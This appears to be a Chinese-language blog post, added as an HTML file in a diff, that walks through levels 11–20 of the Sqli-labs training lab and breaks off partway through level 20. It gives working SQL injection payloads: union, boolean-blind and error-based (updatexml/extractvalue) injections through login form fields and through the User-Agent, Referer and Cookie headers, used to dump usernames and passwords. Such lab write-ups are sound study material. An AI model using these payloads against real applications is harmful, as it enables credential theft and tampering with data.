@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+
+    
+
+    
+        <meta name="description" content="前一部分链接：第1-10关Write-up
+前言之前其他资料学习过程中，学会一个挺好用的学习技巧
+在源码中$sql变量下方加入以下内容
+123echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;.&amp;quot;=============================================">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Huang-ShuWei(Knlvre)">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Sqli-labs(第11-20关)">
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="前一部分链接：第1-10关Write-up
+前言之前其他资料学习过程中，学会一个挺好用的学习技巧
+在源码中$sql变量下方加入以下内容
+123echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;.&amp;quot;=============================================">
+    
+
+    <!--Open Graph Site Name-->
+        <meta property="og:site_name" content="Knlvre">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+    
+        <meta property="og:image" content="https://knlvre.github.io/Knlvre.github-iohttp://img.sj33.cn/uploads/allimg/200912/20091206235017574.jpg">
+    
+
+        <meta name="twitter:card" content="summary_large_image">
+
+    
+
+    
+        <meta name="twitter:image" content="https://knlvre.github.io/Knlvre.github-iohttp://img.sj33.cn/uploads/allimg/200912/20091206235017574.jpg">
+    
+
+    <!-- Title -->
+    
+    <title>Sqli-labs(第11-20关) - Knlvre</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/Knlvre.github-io/css/style.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+
+</head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/Knlvre.github-io/">Knlvre</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/Knlvre.github-io/">
+                            
+                                首页
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/Knlvre.github-io/archives">
+                            
+                                归档
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/Knlvre.github-io/tags">
+                            
+                                标签
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://github.com/Knlvre/Knlvre.github-io">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('http://pic.netbian.com/uploads/allimg/181130/224234-154358895470e3.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>Sqli-labs(第11-20关)</h1>
+                    
+                    <h2 class="post-subheading">
+                        Sqli-labs 第11-20关的学习笔记
+                    </h2>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                            Posted by Knlvre on
+                        
+                        
+                            2019-01-30
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+                <div class="col-lg-4 col-lg-offset-2 col-md-5 col-md-offset-1 post-tags">
+                    
+                        
+
+
+<a href="/Knlvre.github-io/tags/Sqli-labs/">#Sqli-labs</a>
+
+
+                    
+                </div>
+                <div class="col-lg-4 col-md-5 post-categories">
+                    
+                </div>
+            
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <h3 id="前一部分链接：第1-10关Write-up"><a href="#前一部分链接：第1-10关Write-up" class="headerlink" title="前一部分链接：第1-10关Write-up"></a>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/29/Sqli-labs%20%E7%AC%AC1-10%E5%85%B3/">第1-10关Write-up</a></h3><hr>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前其他资料学习过程中，学会一个挺好用的学习技巧</p>
+<p>在源码中<code>$sql</code>变量下方加入以下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-0-1.png" alt="1-0-1"></p>
+<p>网页可以看<code>$sql</code>的内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-0-2.png" alt="1-0-2"></p>
+<hr>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less - 11"></a>Less - 11</h2><p>从源代码来看，提交的用户名为<code>uname</code>密码为<code>passwd</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-1.png" alt="1-1"></p>
+<p>用户名和密码都提交<code>1</code>，说登录失败</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-2.png" alt="1-2"></p>
+<p>常规手段，在密码后面加一个<code>单引号</code>，报错</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-3.png" alt="1-3"></p>
+<p>报错信息可以看出，对<code>id</code>参数用<code>单引号</code>包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-4.png" alt="1-4"></p>
+<p>那么此题从<code>用户名</code>注入和从<code>密码</code>注入都是可以的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-5.png" alt="1-5"></p>
+<p><code>order by</code>测出字段数为2，直接<code>union</code>注入，得到database()</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-6.png" alt="1-6"></p>
+<p>常规手段，爆出数<code>据库名</code>、<code>表名</code>、<code>字段值</code></p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-7.png" alt="1-7"></p>
+<hr>
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less - 12"></a>Less - 12</h2><p>这关<code>HackBar</code>好像出错了，无法POST双引号，直接用网页自带的输入框</p>
+<p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&#39;</code>，没有报错</p>
+<p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&#39;&#39;</code>，没有报错</p>
+<p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&quot;</code>，报错信息才出来，使用<code>双引号</code>加<code>括号</code>包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/2-1.png" alt="2-1"></p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&quot;) union select username,password from users where id=2 #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/2-2.png" alt="2-2"></p>
+<hr>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&#39;</code>，报错，使用<code>单引号</code>加<code>括号</code>包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/3-1.png" alt="3-1"></p>
+<p>但是这关却是<code>布尔注入</code></p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&apos;) or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;&apos;e&apos; #</span><br></pre></td></tr></table></figure>
+<p>不再赘述</p>
+<hr>
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&quot;</code>，报错，使用<code>双引号</code>包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/4-1.png" alt="4-1"></p>
+<p>同样是<code>布尔注入</code></p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&quot; or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,5)=&quot;email&quot; #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/4-2.png" alt="4-2"></p>
+<hr>
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>本关无论怎么提交都没有报错信息</p>
+<p>那就直接加上<code>or 1=1 #</code>来测试了</p>
+<p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&#39;</code>，加上<code>or 1=1 #</code>，页面回显正常，那我们就知道是通过<code>单引号</code>包裹的了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/5-1.png" alt="5-1"></p>
+<p>源码中的确可以看出来是单引号</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/5-2.png" alt="5-2"></p>
+<p>同样是<code>布尔注入</code></p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&apos; or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,5)=&apos;email&apos; #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/5-3.png" alt="5-3"></p>
+<hr>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&quot;)</code>，加上<code>or 1=1 #</code>，页面回显正常，那我们就知道是通过<code>双引号加括号</code>包裹的了</p>
+<p>和15关一样，只是将<code>单引号</code>改成<code>双引号加括号</code>就可以了</p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&quot;) or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,5)=&apos;email&apos; #</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这题比较特殊，就从源代码开始看起吧</p>
+<p>当<code>uname</code>和<code>passwd</code>传入时，<code>uname</code>会被<code>check_input()</code>这个自定义的函数给处理，这个自定义函数内容是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果经过addslashes()函数出来，去掉转义</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果不都是数字，就加上两个单引号（因为不是数字就是字符串）</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>对涉及到的函数进行解释一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">addslashes()</span><br><span class="line"></span><br><span class="line">作用：函数返回在预定义字符之前添加反斜杠的字符串</span><br><span class="line">预定义字符是：①单引号（&apos;）② 双引号（&quot;）③ 反斜杠（\）④ NULL</span><br><span class="line"></span><br><span class="line">提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</span><br><span class="line"></span><br><span class="line">注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stripslashes()</span><br><span class="line"></span><br><span class="line">作用：函数删除由 addslashes() 函数添加的反斜杠</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string()</span><br><span class="line"></span><br><span class="line">作用：函数转义 SQL 语句中使用的字符串中的特殊字符</span><br><span class="line">受影响字符：①\x00 ②\n ③\r ④\ ⑤&apos; ⑥&quot; ⑦\x1a</span><br><span class="line"></span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctype_digit()</span><br><span class="line"></span><br><span class="line">作用：检测字符串中的字符是否都是数字，负数和小数会检测不通过</span><br></pre></td></tr></table></figure>
+<p>说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()。</p>
+<p>在我们less17的check_input()中，对username进行各种转义的处理，所以此处不能使用username进行注入</p>
+<p>那么这题的<code>$sql</code>变量是这样构造的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>也就是说，当你传入的<code>uname</code>在数据库中存在时，才能返回信息</p>
+<p>然后当有返回值时，执行以下语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">mysql_query($update);</span><br></pre></td></tr></table></figure>
+<p>也就是说，当我们输入的<code>uname</code>在数据库里存在是，它就会帮我们修改这个对应的<code>uname</code>的密码，修改为我们输入的<code>passwd</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-1.png" alt="7-1"></p>
+<p>那我们此时就知道不能通过<code>username</code>进行注入，因为会被处理掉，那就通过<code>password</code>来进行</p>
+<p>还是先加<code>单引号</code>看一下报错，发现就是通过<code>单引号</code>包裹的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-2.png" alt="7-2"></p>
+<p>有趣的是，如果我们此时加一个<code>#号</code>，就会把<code>password</code>后面的内容注释掉，那么<code>$update</code>变量就会是这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd';</span></span><br></pre></td></tr></table></figure>
+<p>那么这句语句去执行的后果就是把<code>users</code>表里所有<code>password</code>都改成我们输入的值</p>
+<p>害我再一个一个改回来。。。。</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-3.png" alt="7-3"></p>
+<p>改回来之后开始注入，我们这关利用报错注入，复习一下<code>updatexml()</code>和<code>extractvalue()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">updatexml()</span><br><span class="line">格式：</span><br><span class="line">updatexml(1,concat(0x7e,(),0x7e),1)</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">①updatexml(1,concat(0x7e,(select database()),0x7e),1)</span><br><span class="line">②updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">extractvalue()</span><br><span class="line">格式：</span><br><span class="line">extractvalue(1,concat(0x7e,(),0x7e))</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">①extractvalue(1,concat(0x7e,(select database()),0x7e))</span><br><span class="line">②extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x7e))</span><br></pre></td></tr></table></figure>
+<p>那我们就使用<code>updatexml()</code>函数来进行报错注入：</p>
+<p>注意：记得加上<code>group_concat()</code>，不然返回多行数据无法一起显示出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;&amp;passwd=bb&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;&amp;passwd=bb&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-4.png" alt="7-4"></p>
+<p>当以常规想法，继续往下时发现报错了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;&amp;passwd=bb&apos; and updatexml(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-5.png" alt="7-5"></p>
+<p>出现了这句话：<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p>
+<p>翻译为：不能先select出同一表中的某些值，再update这个表(在同一语句中)</p>
+<p>那就是前面提到的<code>$update</code>在为我们更新<code>users</code>表的时候，我们又去查询，所以冲突了，那怎么解决的？</p>
+<p>办法：加一层<code>select</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;&amp;passwd=bb&apos; and updatexml(1,concat(0x7e,(select group_concat(username,password) from (select username,password from users where id=2)),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-6.png" alt="7-6"></p>
+<p>还是报错，显示：<code>Every derived table must have its own alias</code></p>
+<p>此时就需要在第二层的括号外，加上一个<code>别名（什么都行）</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;&amp;passwd=bb&apos; and updatexml(1,concat(0x7e,(select group_concat(username,password) from (select username,password from users where id=2)hsw),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-7.png" alt="7-7"></p>
+<p>此时数据就被我们爆出来了</p>
+<hr>
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>从源码可以看出，对<code>uname</code>和<code>passwd</code>都用函数<code>check_input</code>进行了处理，那就不能在这两处地方进行注入</p>
+<p>可是看到了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br></pre></td></tr></table></figure>
+<p>并且这个<code>$uagent</code>变量来自于这里：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/8-1.png" alt="8-1"></p>
+<p>现在已经知道，通过HTTP请求包的<code>User-Agent</code>字段来进行注入</p>
+<p>代码需要输入正确的用户名和密码才能执行<code>$insert</code>变量</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/8-2.png" alt="8-2"></p>
+<p>第17关已经让我们修改了用户名密码，这关就可以使用</p>
+<p>此处我们借用<code>Burpsuits</code>来进行注入，提交<code>uname</code>和<code>passwd</code>，并修改<code>User-Agent</code>为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &apos; and extractvalue(1,concat(0x7e,(select database()),0x7e)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<p>注意：在源代码中加上代码，显示<code>$insert</code>变量，来帮助学习</p>
+<p>点击”go”，再返回的内容中，右击  —&gt; “Show response in browser” —&gt; 复制内容  —&gt; 在浏览器中粘贴查看</p>
+<p>此时浏览器代理记得不能断开。做完这些步骤就可以看到内容：</p>
+<p>解释一下<code>$insert</code>变量：我们构造的语句，始终没有逃出<code>INSERT</code>语句后的括号，所以要想办法将单引号包裹掉</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/8-3.png" alt="8-3"></p>
+<p>爆数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &apos; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<p>本关更新的表是<code>uagents</code>表，所以不再需要像前一关那样<code>双层的select＋别名</code>来注入，直接爆出数据</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/8-4.png" alt="8-4"></p>
+<hr>
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>查看源代码，与前一关一样，只是将<code>$uagent</code>变量接受的值变成<code>HTTP_REFERER</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/9-1.png" alt="9-1"></p>
+<p>用<code>Burpsuits</code>抓包下来，发现没有<code>Referer</code>字段，那就自己加上去，并且改值：</p>
+<p>注意：这里Referer不要加在最后一行，不然不会被归入头部信息中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">' and extractvalue(1,concat(0x7e,(select concat(username,password) from users where id=2),0x7e)) or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/9-2.png" alt="9-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/9-3.png" alt="9-3"></p>
+<p>原理和前一关一样，不再赘述</p>
+<hr>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>从源代码中可以看出，像之前关卡那样使用<code>uname</code>和<code>passwd</code>进行注入已经不行了，因为在数据库中没有对这两个语句做任何的查询</p>
+<p>继续往下看，看到了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>利用<code>Burpsuits</code>添加<code>Cookie: uname</code>字段，之前的<code>uname</code>和<code>passwd</code>字段随意添加值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=<span class="string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span></span><br></pre></td></tr></table></figure>
+<p>发现返回<code>Your Cookie is deleted</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/10-1.png" alt="10-1"></p>
+<p>仔细看完源代码发现，注意到需要满足if条件，才会执行语句查询</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/10-2.png" alt="10-2"></p>
